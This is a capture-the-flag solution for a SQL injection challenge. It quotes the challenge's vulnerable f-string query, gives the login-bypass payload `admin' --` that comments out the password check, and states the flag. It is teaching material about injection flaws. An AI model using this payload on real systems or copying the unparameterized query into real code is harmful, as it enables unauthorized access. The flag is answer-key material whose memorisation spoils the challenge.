**Solution: A08 - SQL INJECTION**

**Concept**  
Authentication bypass via unparameterized dynamic SQL injection.

**Walkthrough**  
1. Inspect the SQL query in `challenge/app/app.py`:
   `query = f"SELECT username, secret_flag FROM users WHERE username = '{username}' AND password = '{password}'"`
2. Set `username` parameter to `admin' --`.
3. The SQL engine executes:
   `SELECT username, secret_flag FROM users WHERE username = 'admin' --' AND password = ''`
4. The database authenticates the user as `admin` and returns the flag.

**Flag**  
`flag{sql_injection_master}`
